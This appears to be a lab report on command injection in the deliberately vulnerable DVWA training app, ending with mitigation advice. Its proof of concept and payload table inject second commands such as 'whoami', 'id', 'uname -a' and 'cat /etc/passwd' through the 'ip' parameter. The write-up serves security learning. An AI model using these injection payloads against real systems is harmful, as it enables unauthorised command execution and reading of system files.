# Web-vulnerabilities# 🧨 Command Injection Vulnerability Report

## 🔍 Vulnerability Name
Command Injection

## 🧪 Vulnerable Application
DVWA - Damn Vulnerable Web Application  
URL: http://localhost/dvwa/vulnerabilities/exec/

## 🔓 Security Level
Low

## ⚙️ Vulnerable Parameter
- `ip` parameter

## 🧾 PoC (Proof of Concept)
### 1. Input:
```text
127.0.0.1; whoami

uid=33(www-data) gid=33(www-data) groups=33(www-data)
⚔️ Payloads Tested
| Payload                      | Description      |                      |
| ---------------------------- | ---------------- | -------------------- |
| `127.0.0.1; whoami`          | Run `whoami`     |                      |
| `127.0.0.1 && id`            | Chain with `id`  |                      |
| \`127.0.0.1                  | uname -a\`       | Use pipe for `uname` |
| `127.0.0.1; cat /etc/passwd` | Read system file |                      |


    🔥 Impact
Remote command execution could allow an attacker to:

Read sensitive files

Gain shell access

Escalate privileges

🛡️ Mitigation
Avoid using system(), exec(), or shell_exec() with user input.

Use whitelist validation.

Escape user inputs if necessary.

Use safe libraries like subprocess.run() with shell=False.

